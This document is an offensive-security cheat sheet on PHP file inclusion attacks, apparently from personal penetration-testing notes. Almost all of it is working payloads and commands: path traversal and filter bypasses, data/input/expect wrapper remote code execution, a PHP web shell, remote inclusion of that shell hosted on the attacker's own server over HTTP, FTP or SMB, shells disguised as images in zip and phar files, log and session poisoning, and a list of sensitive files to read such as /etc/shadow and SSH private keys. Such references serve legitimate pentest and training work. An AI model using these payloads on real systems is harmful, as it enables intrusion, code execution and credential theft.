# File Inclusion

- [ ] Try direct inclusion `index.php?language=/etc/passwd`
- [ ] Try basic directory traversal
- [ ] Try including a leading slash `/`
- [ ] Try a leading dot-slash `./`
- [ ] Check for non-recursive directory traversal
- [ ] Test for path truncation if extensions are appended
- [ ] Try different PHP filters
- [ ] Check for log poisoning
- [ ] Check RFI
	- [ ] If HTTP is blocked, try other schemes like FTP or SMB

## Local File Inclusion

| **Command**                                                                                        | **Description**                                           |
| -------------------------------------------------------------------------------------------------- | --------------------------------------------------------- |
|  **Basic LFI**                                                                                     |                                                           |
|  `/index.php?language=/etc/passwd`                                                                 | Basic LFI                                                 |
|  `/index.php?language=../../../../etc/passwd`                                                      | LFI with path traversal                                   |
|  `/index.php?language=/../../../etc/passwd`                                                        | LFI with name prefix                                      |
|  `/index.php?language=./languages/../../../../etc/passwd`                                          | LFI with approved path                                    |
|  **LFI Bypasses**                                                                                  |                                                           |
| `/index.php?language=....//....//....//....//etc/passwd`                                           | Bypass basic path traversal filter                        |
|  `/index.php?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64`          | Bypass filters with URL encoding                          |
|  `/index.php?language=non_existing_directory/../../../etc/passwd/./././.[./ REPEATED ~2048 times]` | Bypass appended extension with path truncation (obsolete) |
|  `/index.php?language=../../../../etc/passwd%00`                                                   | Bypass appended extension with null byte (obsolete)       |
| `/index.php?language=php://filter/read=convert.base64-encode/resource=config`                      | Read PHP with base64 filter                               |


## Remote Code Execution

| **Command**                                                                                                                 | **Description**                       |
| --------------------------------------------------------------------------------------------------------------------------- | ------------------------------------- |
|  **PHP Wrappers**                                                                                                           |                                       |
| `/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id`                    | RCE with data wrapper                 |
| `curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id"` | RCE with input wrapper                |
|  `curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"`                                                       | RCE with expect wrapper               |
|  **RFI**                                                                                                                    |                                       |
|  `echo '<?php system($_GET["cmd"]); ?>' > shell.php && python3 -m http.server <LISTENING_PORT>`                             | Host web shell                        |
| `/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id`                                                     | Include remote PHP web shell          |
| **LFI + Upload** - See [[cheatsheat-File Upload Attacks\|File Upload Attacks]]                                              |                                       |
| `echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif`                                                                     | Create malicious image                |
|  `/index.php?language=./profile_images/shell.gif&cmd=id`                                                                    | RCE with malicious uploaded image     |
|  `echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php`                                             | Create malicious zip archive 'as jpg' |
|  `/index.php?language=zip://shell.zip%23shell.php&cmd=id`                                                                   | RCE with malicious uploaded zip       |
|  `php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg`                                                        | Create malicious phar 'as jpg'        |
|  `/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id`                                                 | RCE with malicious uploaded phar      |
|  **Log Poisoning**                                                                                                          |                                       |
|  `/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd`                                                | Read PHP session parameters           |
|  `/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E`                                              | Poison PHP session with web shell     |
|  `/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id`                                         | RCE through poisoned PHP session      |
|  `curl -s "http://<SERVER_IP>:<PORT>/index.php" -A '<?php system($_GET["cmd"]); ?>'`                                        | Poison server log                     |
|  `/index.php?language=/var/log/apache2/access.log&cmd=id`                                                                   | RCE through poisoned PHP session      |
## Misc

| **Command** | **Description** |
| --------------|-------------------|
| `ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287` | Fuzz page parameters |
| `ffuf -w /opt/useful/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287` | Fuzz LFI payloads |
| `ffuf -w /opt/useful/SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287` | Fuzz webroot path |
| `ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287` | Fuzz server configurations |
| [LFI Wordlists](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)|
| [LFI-Jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt) |
| [Webroot path wordlist for Linux](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt)
| [Webroot path wordlist for Windows](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt) |
| [Server configurations wordlist for Linux](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux)
| [Server configurations wordlist for Windows](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows) |


## File Inclusion Functions

| **Function** | **Read Content** | **Execute** | **Remote URL** |
| ----- | :-----: | :-----: | :-----: |
| **PHP** |
| `include()`/`include_once()` | Yes | Yes | Yes |
| `require()`/`require_once()` | Yes | Yes | No |
| `file_get_contents()` | Yes | No | Yes |
| `fopen()`/`file()` | Yes | No | No |
| **NodeJS** |
| `fs.readFile()` | Yes | No | No |
| `fs.sendFile()` | Yes | No | No |
| `res.render()` | Yes | Yes | No |
| **Java** |
| `include` | Yes | No | No |
| `import` | Yes | Yes | Yes |
| **.NET** | |
| `@Html.Partial()` | Yes | No | No |
| `@Html.RemotePartial()` | Yes | No | Yes |
| `Response.WriteFile()` | Yes | No | No |
| `include` | Yes | Yes | Yes |

---

## Additional Methods

Check [[cheatsheat-Command Injections]] for additional filter bypass techniques that can be combined here.

### Path truncation
#### Create truncated string

```
echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done
```

#### Null byte

Add a `%00` at the end of the payload -> `/etc/passwd%00`

### PHP Filters

- [[https://www.php.net/manual/en/filters.string.php|string filters]]
- [[https://www.php.net/manual/en/filters.convert.php|conversion filters]]
- [[https://www.php.net/manual/en/filters.compression.php|compression filters]]
- [[https://www.php.net/manual/en/filters.encryption.php|encryption filters]]

#### Source code disclosure

```
php://filter/read=convert.base64-encode/resource=config
```

#### Data wrapper

Can be used to include external data, including PHP code.

```
/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini
```

> [!tip]
> We may need to do some trial and error to find the correct PHP version

**RCE with Data wrapper**

```
$ echo '<?php system($_GET["cmd"]); ?>' | base64

PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
```

```
/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id
```

#### Input wrapper

Can also be used to include external input and execute PHP code. Our input is passed as POST data.

```
$ curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid
            uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

> [!tip]
> To pass our command as a GET request, we need the vulnerable function to also accept GET request (i.e. use `$_REQUEST`). If it only accepts POST requests, then we can put our command directly in our PHP code, instead of a dynamic web shell (e.g. `<\?php system('id')?>`)

#### Expect wrapper

The Expect wrapper allows us to directly run commands through URL streams. Expect works very similarly to the web shells we've used earlier, but don't need to provide a web shell, as it is designed to execute commands.

```
$ curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id" | grep uid

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

See [[cheatsheat-Web Attacks]] for details on using expect in [[cheatsheat-Web Attacks#XXE|XXE]] attacks

### Remote File Inclusion

Try to include a URL to see if it returns anything

```
/index.php?language=http://127.0.0.1:80/index.php
```

#### RCE with RFI

##### HTTP

**Host our shell**

```
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

**Navigate to our shell from the vulnerable RFI point**

```
/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id
```

> [!tip]
> Make sure there is a server listening on our machine before doing this.

##### FTP

**Host our shell with FTP**

```
sudo python -m pyftpdlib -p 21
```

```
/index.php?language=ftp://<OUR_IP>/shell.php&cmd=id
```

##### SMB

**Host with impacket**

```
impacket-smbserver -smb2support share $(pwd)
```

```
/index.php?language=\\\<OUR_IP>\share\shell.php&cmd=whoami
```

### LFI with File Uploads

#### ZIP Files

##### Create a zip file

```
echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
```

> [!tip]
> This may still be detected as a zip file, even though it's named `shell.jpg`. This will be useful if zip uploads are allowed.

##### Execute the code

```
/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id
```

#### PHAR wrapper

##### Write the shell.php

```
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');

$phar->stopBuffering();
```

##### Compile into a phar file

```
php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
```

##### Interact with the phar file

```
/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
```

### Log Poisoning

#### PHP Session Poisoning

##### View the contents of our session token

```
/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd
```

##### Try with a random value

```
/index.php?language=session_poisoning
```

Now view the session token again to see if the value of `page` in the session file

##### Write a basic web shell into the page value

```
/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
```

##### Include the session file and execute commands

```
/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id
```

### Server log poisoning

#### View the log

```
/index.php?language=/var/log/apache2/access.log
```

#### Write web shell into the user-agent header

```
$ echo -n "User-Agent: <?php system(\$_GET['cmd']); ?>" > Poison

$ curl -s "http://<SERVER_IP>:<PORT>/index.php" -H @Poison
```

We can also try similar attacks on other log files

- `/var/log/sshd.log`
- `/var/log/mail`
- `/var/log/vsftpd.log`

> [!tip]
> The `User-Agent` header is also shown on process files under the Linux `/proc/` directory. So, we can try including the `/proc/self/environ` or `/proc/self/fd/N` files (where N is a PID usually between 0-50), and we may be able to perform the same attack on these files. This may become handy in case we did not have read access over the server logs, however, these files may only be readable by privileged users as well.

## Automated Scanning

### Fuzzing parameters

Example

```
$ ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287
```

### LFI wordlists

Example with JHaddix list

```
ffuf -w /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287
```

### Fuzzing server files

```
$ ffuf -w /opt/useful/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287
```

### Interesting Files to Target

**Linux**

```
/etc/passwd
/etc/shadow
/etc/hosts
/proc/self/environ
/proc/self/cmdline
/proc/self/fd/[0-9]*
/var/log/apache2/access.log
/var/log/nginx/access.log
~/.bash_history
~/.ssh/id_rsa
```

**Windows**

```
C:\windows\win.ini
C:\windows\system32\drivers\etc\hosts
C:\inetpub\wwwroot\web.config
C:\xampp\apache\conf\httpd.conf
```


---

## References

- [PayloadsAllTheThings - File Inclusion](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)
- [HackTricks - File Inclusion](https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html)
